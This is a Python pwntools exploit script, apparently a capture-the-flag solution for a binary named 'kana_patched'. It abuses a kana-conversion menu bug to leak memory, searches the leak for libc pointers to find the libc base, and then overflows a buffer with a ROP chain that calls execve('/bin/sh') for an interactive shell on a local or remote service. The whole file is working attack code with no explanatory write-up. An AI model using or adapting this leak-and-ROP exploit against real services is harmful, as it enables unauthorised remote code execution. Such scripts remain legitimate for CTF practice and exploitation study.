#!/usr/bin/python2

from pwn import *

exe = ELF("kana_patched")

context.binary = exe

sla = lambda r,a,b : r.sendlineafter('{}'.format(a),'{}'.format(b)) 

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        #r = remote('142.93.35.133',30570)
        r = remote('localhost',13334)

    return r

def sl(r, payload):
    sla(r, ">>", payload)

def new_kana(r, payload):
    sl(r, 4)
    sl(r, payload)

def to_kata(r):
    sl(r, 1)

def to_hira(r):
    sl(r, 2)

def to_abc(r):
    sl(r, 4)

def to_exit(r):
    sl(r, 5)

#allign the leaked data to match the assummed value of a pointer
def allign_leaks(start, leaks):
    consec_chars = 0
    while True:
        if leaks[start] != "\x00":
            consec_chars += 1
        if leaks[start] == '\x00' and leaks[start-1] == '\x00' and consec_chars >= 5:
            break
        start += 1
    return start -7

run_count = 0

def main():
    global run_count
    run_count += 1
    log.info("current run count: {}".format(run_count))
    r = conn()

    #can overwrite some pointers by putting a before it
    #putting chars before also seems to level out the size of the leak for some reason
    new_kana(r, "A"+"\xe3\x83\xbc"*20)#+'\xe3\x82\xa2')
  
    hunted_offset = 0x219fa0
    #values from my offset testing, trying to find on that's consistant
    #hunted_offset = 0x397120
    #0x394120 0x397120 0x391120
    #0x4e0 0x4774E0
    #0xce0 0x219CE0
    #0xfa0 0x219FA0


    r.sendline("3")

    r.recvuntil(":")
    r.recvuntil(":")
    leaks = r.recvline()
    print 'len: ' + str(len(leaks))


    #parse through the large glob of leaked text to extract pointers
    count = 0
    real_leaks = []
    while count < len(leaks):
        try:
            count = allign_leaks(count, leaks)
            real_leaks.append(u64(leaks[count:count+8]))
            count += 8
        except:
            log.info("failed to leak")
            count += 8
    libc_leaks = []

    #isolate the libc pointers
    for leak in real_leaks:
        if hex(leak)[:4] == '0x7f' and hex(leak)[:5] != '0x7ff':
            libc_leaks.append(leak)

    log.info("printing libc_leaks")
    for leak in libc_leaks:
        log.info(hex(leak))

    #common offsets I found
    #eec, ce0, fa0, 4e0, 120

    libc_base = 0

    #see if the specific leak I'm looking for is present
    try: 
        for chef in libc_leaks:
            if hex(chef)[-3:] == 'fa0':
                log.info("libc_leak found")
                libc_base = chef - hunted_offset
                log.info("libc base: {}".format(hex(libc_base)))
    except:
        r.close()
        main()


    #if no leak, restart
    if libc_base == 0:
        log.info("no leak :(")
        r.recvuntil('>>')
        r.close()
        main()

    #calculate offsets
    pop_rsi = libc_base + 0x000000000002be51#: pop rsi; ret;
    pop_rdx = libc_base + 0x000000000011f497#: pop rdx; pop r12; ret;
    pop_rax = libc_base + 0x0000000000045eb0#: pop rax; ret;
    pop_rdi = libc_base + 0x000000000002a3e5#: pop rdi; ret;
    bin_sh  = libc_base + 0x1D8698
    syscall = libc_base + 0x0000000000091396#: syscall; ret;

    #build payload to call syscall
    payload = p64(pop_rsi)
    payload += p64(0)
    payload += p64(pop_rdx)
    payload += p64(0)
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(pop_rax)
    payload += p64(59)
    payload += p64(syscall)

    #ROP and don't stop
    r.sendlineafter('>>','asdfasdf'*14+"AAA"+payload)
   
    log.info("run count: {}".format(run_count))

    r.interactive()


if __name__ == "__main__":
    main()
